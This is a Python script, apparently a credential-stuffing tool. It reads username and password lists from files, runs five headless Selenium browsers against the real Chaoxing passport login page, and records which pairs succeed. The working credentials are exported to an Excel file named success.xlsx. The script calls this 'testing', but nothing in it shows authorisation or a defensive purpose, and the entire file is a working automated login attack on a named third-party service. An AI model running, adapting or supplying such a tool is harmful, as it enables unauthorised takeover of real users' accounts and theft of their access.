import threading
import queue
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time
import openpyxl
from openpyxl.styles import Font, Alignment, Border, Side
from colorama import Fore, Back, Style, init
import os

# 初始化colorama，支持Windows系统
init(autoreset=True)

# 全局变量用于存储成功的账号密码
success_credentials = []
# 线程锁，用于安全地修改共享变量
lock = threading.Lock()


def read_credentials():
    """从文件中读取账号和密码，返回一一对应的列表"""
    try:
        # 读取账号文件
        with open('user.txt', 'r', encoding='utf-8') as f:
            users = [line.strip() for line in f if line.strip()]

        # 读取密码文件
        with open('password.txt', 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]

        # 检查账号和密码数量是否一致
        if len(users) != len(passwords):
            print(f"{Fore.YELLOW}警告：账号数量({len(users)})与密码数量({len(passwords)})不匹配")
            # 取最小长度，确保一一对应
            min_length = min(len(users), len(passwords))
            return list(zip(users[:min_length], passwords[:min_length]))

        return list(zip(users, passwords))

    except FileNotFoundError as e:
        print(f"{Fore.RED}错误：找不到文件 {e.filename}")
        return []
    except Exception as e:
        print(f"{Fore.RED}读取文件时发生错误：{str(e)}")
        return []


def create_headless_driver():
    """创建无头浏览器实例"""
    chrome_options = Options()
    # 无头模式
    chrome_options.add_argument("--headless=new")
    # 禁用GPU加速
    chrome_options.add_argument("--disable-gpu")
    # 最大化窗口
    chrome_options.add_argument("--start-maximized")
    # 禁用沙箱模式
    chrome_options.add_argument("--no-sandbox")
    # 禁用共享内存使用
    chrome_options.add_argument("--disable-dev-shm-usage")

    driver = webdriver.Chrome(options=chrome_options)
    return driver


def test_login_worker(queue, login_url):
    """登录测试工作线程"""
    # 每个线程创建自己的浏览器实例
    driver = create_headless_driver()

    try:
        while not queue.empty():
            # 从队列获取任务
            index, user, pwd = queue.get()

            try:
                # 导航到登录页
                driver.get(login_url)
                time.sleep(1)  # 等待页面加载

                # 输入账号（先清空再输入）
                username_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '//*[@id="phone"]'))
                )
                username_field.clear()
                username_field.send_keys(user)

                # 输入密码（先清空再输入）
                password_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '//*[@id="pwd"]'))
                )
                password_field.clear()
                password_field.send_keys(pwd)

                # 点击登录按钮
                WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//*[@id="loginBtn"]'))
                ).click()

                # 等待登录结果
                time.sleep(2)

                # 检查是否登录失败（判断错误提示是否出现）
                login_failed = False
                try:
                    error_message = driver.find_element(By.XPATH, '//div[contains(text(), "手机号或密码错误")]')
                    if error_message:
                        print(f"{Fore.RED}[{index}] 登录失败 - 账号: {user}, 密码: {pwd} - 原因: 手机号或密码错误")
                        login_failed = True
                except:
                    pass

                if not login_failed:
                    # 检查是否登录成功（判断页面是否跳转）
                    current_url = driver.current_url
                    if current_url != login_url:
                        print(f"{Fore.GREEN}[{index}] 登录成功 - 账号: {user}, 密码: {pwd}")
                        # 线程安全地添加到成功列表
                        with lock:
                            success_credentials.append((user, pwd))
                    else:
                        print(f"{Fore.RED}[{index}] 登录失败 - 账号: {user}, 密码: {pwd} - 原因: 未知错误")

            except Exception as e:
                print(f"{Fore.RED}[{index}] 测试出错 - 账号: {user}, 密码: {pwd} - 错误: {str(e)}")

            finally:
                # 标记任务完成
                queue.task_done()
    finally:
        # 关闭浏览器
        driver.quit()


def export_to_excel(data):
    """将成功的账号密码导出到Excel文件"""
    if not data:
        print(f"{Fore.YELLOW}没有成功的账号密码需要导出到Excel")
        return

    try:
        # 创建工作簿和工作表
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "登录成功的账号密码"

        # 设置表头
        ws['A1'] = "序号"
        ws['B1'] = "账号"
        ws['C1'] = "密码"

        # 设置表头样式
        header_font = Font(bold=True, color="FFFFFF")
        header_alignment = Alignment(horizontal="center", vertical="center")
        thin_border = Border(
            left=Side(style='thin'),
            right=Side(style='thin'),
            top=Side(style='thin'),
            bottom=Side(style='thin')
        )

        for cell in ws[1]:
            cell.font = header_font
            cell.alignment = header_alignment
            cell.border = thin_border
            cell.fill = openpyxl.styles.PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")

        # 填充数据
        for i, (user, pwd) in enumerate(data, 1):
            ws.cell(row=i + 1, column=1, value=i).alignment = header_alignment
            ws.cell(row=i + 1, column=1, value=i).border = thin_border

            ws.cell(row=i + 1, column=2, value=user).alignment = header_alignment
            ws.cell(row=i + 1, column=2, value=user).border = thin_border

            ws.cell(row=i + 1, column=3, value=pwd).alignment = header_alignment
            ws.cell(row=i + 1, column=3, value=pwd).border = thin_border

        # 调整列宽
        ws.column_dimensions['A'].width = 8
        ws.column_dimensions['B'].width = 20
        ws.column_dimensions['C'].width = 20

        # 保存文件
        wb.save("success.xlsx")
        print(f"{Fore.GREEN}已成功将 {len(data)} 组登录成功的账号密码导出到 success.xlsx")

    except Exception as e:
        print(f"{Fore.RED}导出Excel文件时发生错误：{str(e)}")


def main():
    # 登录页面URL
    login_url = "https://passport2.chaoxing.com/login?fid=&newversion=true&refer=https%3A%2F%2Fi.chaoxing.com"

    # 读取账号密码
    credentials = read_credentials()

    if not credentials:
        print(f"{Fore.RED}没有可用的账号密码进行测试")
        return

    total = len(credentials)
    print(f"{Fore.CYAN}共读取到 {total} 组账号密码，准备开始测试...\n")

    # 创建任务队列
    q = queue.Queue()
    for i, (user, pwd) in enumerate(credentials, 1):
        q.put((i, user, pwd))

    # 线程数量
    thread_count = 5
    print(f"{Fore.CYAN}使用 {thread_count} 个线程进行并行测试...\n")

    # 创建并启动线程
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=test_login_worker, args=(q, login_url))
        t.start()
        threads.append(t)

    # 等待所有任务完成
    q.join()

    # 等待所有线程结束
    for t in threads:
        t.join()

    # 导出成功的账号密码到Excel
    export_to_excel(success_credentials)

    # 输出总结信息
    success_count = len(success_credentials)
    fail_count = total - success_count
    print(
        f"\n{Style.BRIGHT}{Fore.CYAN}测试完成 - 总计: {total}, 成功: {Fore.GREEN}{success_count}, 失败: {Fore.RED}{fail_count}")


if __name__ == "__main__":
    main()
